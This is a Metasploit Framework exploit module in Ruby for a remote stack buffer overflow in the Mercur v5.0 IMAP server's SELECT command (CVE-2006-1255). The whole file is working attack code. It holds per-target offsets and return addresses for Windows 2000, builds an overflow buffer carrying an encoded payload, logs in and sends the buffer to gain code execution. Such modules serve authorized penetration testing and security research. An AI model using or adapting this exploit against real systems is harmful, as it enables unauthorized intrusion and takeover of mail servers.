##
# $Id: mercur_imap_select_overflow.rb 10394 2010-09-20 08:06:27Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require \'msf/core\'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Imap

	def initialize(info = {})
		super(update_info(info,
			\'Name\'           => \'Mercur v5.0 IMAP SP3 SELECT Buffer Overflow\',
			\'Description\'    => %q{
					Mercur v5.0 IMAP server is prone to a remotely exploitable
				stack-based buffer overflow vulnerability. This issue is due
				to a failure of the application to properly bounds check
				user-supplied data prior to copying it to a fixed size memory buffer.
				Credit to Tim Taylor for discover the vulnerability.
			},
			\'Author\'         => [ \'Jacopo Cervini <acaro [at] jervus.it>\' ],
			\'License\'        => BSD_LICENSE,
			\'Version\'        => \'$Revision: 10394 $\',
			\'References\'     =>
				[
					[ \'CVE\', \'2006-1255\' ],
					[ \'OSVDB\', \'23950\' ],
					[ \'BID\', \'17138\' ],
				],
			\'Privileged\'     => true,
			\'DefaultOptions\' =>
				{
					\'EXITFUNC\' => \'process\',
				},
			\'Payload\'        =>
				{
					\'Space\'    => 400,
					\'BadChars\' => \"\\x00\",
					\'StackAdjustment\' => -3500,

				},
			\'Platform\'       => \'win\',
			\'Targets\'        =>
				[
					[\'Windows 2000 Server SP4 English\',  { \'Offset\' => 126, \'Ret\' => 0x13e50b42 }],
					[\'Windows 2000 Pro SP1 English\',     { \'Offset\' => 127, \'Ret\' => 0x1446e242 }],
				],
			\'DefaultTarget\'  => 0,
			\'DisclosureDate\' => \'Mar 17 2006\'))

	end

	def exploit
		sploit =  \"a001 select \" + \"\\x43\\x49\\x41\\x4f\\x20\\x42\\x41\\x43\\x43\\x4f\\x20\"
		sploit << rand_text_alpha_upper(94) + rand_text_alpha_upper(target[\'Offset\'])
		sploit << [target.ret].pack(\'V\') + \"\\r\\n\" + rand_text_alpha_upper(8)
		sploit << payload.encoded + rand_text_alpha_upper(453)

		info = connect_login

		if (info == true)
			print_status(\"Trying target #{target.name} using heap address at 0x%.8x...\" % target.ret)
			sock.put(sploit + \"\\r\\n\")
		else
			print_status(\"Not falling through with exploit\")
		end

		handler
		disconnect
	end
end
